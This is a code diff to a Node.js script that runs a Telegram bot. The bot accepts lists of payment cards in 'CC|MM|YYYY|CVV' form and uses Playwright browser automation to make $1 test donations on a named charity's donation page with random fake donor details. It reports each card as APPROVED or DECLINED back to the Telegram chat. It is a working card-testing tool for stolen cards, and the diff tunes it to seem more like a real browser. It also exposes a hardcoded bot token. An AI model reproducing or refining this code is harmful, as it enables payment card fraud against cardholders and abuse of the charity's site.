@@ -14,7 +14,7 @@ http.createServer((req, res) => {
 // --- TELEGRAM BOT CONFIGURATION (HTTP API) ---
 const TOKEN = '8973813335:AAG4BTEw5O-lmnhOuApDOp_DmQa0TWBRB60';
 let lastUpdateId = 0;
-let lastChatId = null; // Store the last user chat ID globally
+let lastChatId = null;
 
 const logGreen = (text) => console.log(`\x1b[32m${text}\x1b[0m`);
 const logRed = (text) => console.log(`\x1b[31m${text}\x1b[0m`);
@@ -42,16 +42,14 @@ async function startTelegramPolling() {
                 for (const update of data.result) {
                     lastUpdateId = update.update_id;
                     if (update.message && update.message.text) {
-                        lastChatId = update.message.chat.id; // Save chat ID here
+                        lastChatId = update.message.chat.id;
                         const text = update.message.text.trim();
 
-                        // Handle /start command
                         if (text.startsWith('/start')) {
                             await sendTelegramMessage(lastChatId, `👋 *Welcome to the Automation Bot!*\n\nSend your card list using the format:\n\`CC|MM|YYYY|CVV\`\n\nType /cvv for quick instructions.`);
                             continue;
                         }
 
-                        // Handle /cvv command
                         if (text.startsWith('/cvv')) {
                             const cleanText = text.replace('/cvv', '').trim();
                             if (!cleanText.includes('|')) {
@@ -169,14 +167,17 @@ function generateRandomInfo() {
         const profile = generateRandomInfo();
 
         const context = await browser.newContext({
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            extraHTTPHeaders: {
+                'Accept-Language': 'en-US,en;q=0.9',
+            }
         });
         const page = await context.newPage();
-        page.setDefaultNavigationTimeout(30000);
+        page.setDefaultNavigationTimeout(60000);
 
         try {
-            await page.goto('https://act.oceana.org/page/141584/donate/1?val&val&val&ea.tracking.id=website&op=DONATE', { waitUntil: 'domcontentloaded' });
-            await page.waitForSelector('input[name="transaction.donationAmt"]', { timeout: 30000 });
+            await page.goto('https://act.oceana.org/page/141584/donate/1?val&val&val&ea.tracking.id=website&op=DONATE', { waitUntil: 'domcontentloaded', timeout: 60000 });
+            await page.waitForSelector('input[name="transaction.donationAmt"]', { timeout: 60000 });
 
             // 1. One-Time & $1 amount
             await page.click('text="One-Time"').catch(() => {});
@@ -225,7 +226,7 @@ function generateRandomInfo() {
             await page.selectOption('select[name="supporter.region"]', { label: 'New York' }).catch(() => {});
 
             // 4. Fill VGS iframes
-            await page.waitForSelector('iframe', { timeout: 5000 }).catch(() => {});
+            await page.waitForSelector('iframe', { timeout: 15000 }).catch(() => {});
             
             const frames = page.frames();
             for (const frame of frames) {
@@ -265,12 +266,9 @@ function generateRandomInfo() {
                 const safeCCName = cc.slice(-4);
                 await page.screenshot({ path: `result_APPROVED_${safeCCName}.png` });
 
-                // Send success message to Telegram
                 await sendTelegramMessage(lastChatId, `✅ *[APPROVED] SUCCESS!*\n\`${listaInput}\`\nAmount: $1`);
             } else {
                 logRed(`>>> [DECLINED] FAILED! | CC: ${listaInput} | Amount: $1 <<<`);
-                
-                // Send failed message to Telegram
                 await sendTelegramMessage(lastChatId, `❌ *[DECLINED] FAILED!*\n\`${listaInput}\``);
             }
 
